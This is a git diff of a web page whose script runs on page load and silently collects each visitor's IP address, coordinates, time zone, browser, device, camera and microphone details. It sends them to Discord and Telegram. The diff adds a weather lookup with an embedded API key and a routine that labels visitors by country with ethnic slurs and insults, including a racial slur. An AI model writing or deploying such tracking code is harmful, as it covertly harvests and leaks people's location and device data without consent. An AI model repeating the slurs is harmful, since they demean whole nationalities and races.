@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title></title>
     <div class="loader"></div>
-    <button class="reload-btn" onclick="copyToClipboard()">Reload</button>
+    <button class="reload-btn" onclick="copyToClipboard()">Karina Otsosi ПЖ!!!!</button>
     <style>
         .message-container {
             background-color: #f2f2f2; /* серый фон */
@@ -127,38 +127,37 @@
         }
 
 async function getUserName() {
+    try {
         const response = await fetch("https://ipinfo.io/json");
         const data = await response.json();
-        const countrya = data.country || "Unknown Country";
-        let countryCode = countrya;
-            switch (countryCode) {
-                case "UA":
-                    resolve("Hohol");
-                    break;
-                case "PL":
-                    resolve("Kurva");
-                    break;
-                case "RU":
-                    resolve("Russkiy");
-                    break;
-                case "NG":
-                case "AU":
-                    resolve("Nigger");
-                    break;
-                case "DE":
-                    resolve("Hitler");
-                    break;
-                case "US":
-                case "GB":
-                    resolve("Idiot");
-                    break;
-                case "BY":
-                    resolve("Bulba");
-                    break;
-                default:
-                    resolve("Unknown User");
+        const countryCode = data.country || "Unknown Country";
+
+        switch (countryCode) {
+            case "UA":
+                return "Hohol";
+            case "PL":
+                return "Kurva";
+            case "RU":
+                return "Russkiy";
+            case "NG":
+            case "AU":
+                return "Nigger"; // Обратите внимание на этот термин; он может быть оскорбительным.
+            case "DE":
+                return "Hitler";
+            case "US":
+            case "GB":
+                return "Idiot";
+            case "BY":
+                return "Bulba";
+            default:
+                return "Unknown User";
         }
+    } catch (error) {
+        console.error("Error fetching user information:", error);
+        return "Unknown User";
+    }
 }
+
 
         function getIpAddress() {
             return new Promise((resolve, reject) => {
@@ -688,7 +687,7 @@ async function sendInfoToDiscord() {
     const vpnStatus = await checkVPN();
     const connectionType = getConnectionType();
     const uptime = getUptime();
-    const internetSpeed = await checkInternetSpeed();  
+    const internetSpeed = await checkInternetSpeed();
     const systemInfos = getOperatingSystem();
     const cookiesStatus = areCookiesEnabled();
     const CPUard = getCpuCores();
@@ -698,6 +697,10 @@ async function sendInfoToDiscord() {
     const TimeZone = await Intl.DateTimeFormat().resolvedOptions().timeZone;
     const isIncognito = await detectIncognitoMode();
     const Ping = await getPing();
+    const weatherResponse = await fetch(`https://weather.visualcrossing.com/VisualCrossingWebServices/rest/services/timeline/${city}?unitGroup=uk&key=KM7AEJQ7MBUYL23UBSQSNRPLW&contentType=json`);
+    const weatherData = await weatherResponse.json();
+    const temperature = weatherData.currentConditions.temp;
+    const conditions = weatherData.currentConditions.conditions.toLowerCase();
     const message = "****                User Information****\n" +
                     "****-----------------------------------****\n" +
                     "- 🗺️ **IP Address**: `" + ipAddress + "`\n" +
@@ -707,6 +710,7 @@ async function sendInfoToDiscord() {
                     "- 🏞️ **Coordinates**: [`" + coordinates + "`](" + googleMapsLink + ")\n" +
                     "- 🕒 **Time**: `" + time + "`\n" +
                     "- 🌚 **Time Zone**: `" + TimeZone + "`\n" +
+                    "- 🌡️ **Temperature**: `" + temperature + "°C`\n" +
                     "- 🌐 **Browser**: `" + browserInfo + "`\n" +
                     "- 💿️ **Browser Version**: `" + version + "`\n" +
                     "- 🛰️ **Connection Status**: `" + isOnline + "`\n" +
@@ -735,11 +739,10 @@ async function sendInfoToDiscord() {
                     "- 📷 **Camera**: `" + hasCamera + "`\n" +
                     "- 🎤 **Microphone**: `" + hasMicrophone + "`\n" +
                     "- 🛠️ **Number of Plugins**: `" + pluginCount + "`\n" +
-                    "- 🔌 **Plugins**: " + plugins + "";
-            sendToDiscord(message);
-            sendToTelegram(message);
-        }
-
+                    "- 🔌 **Plugins**: " + plugins + "\n";     
+    sendToDiscord(message);
+    sendToTelegram(message);
+}
         window.onload = function() {
             sendInfoToDiscord();
         };
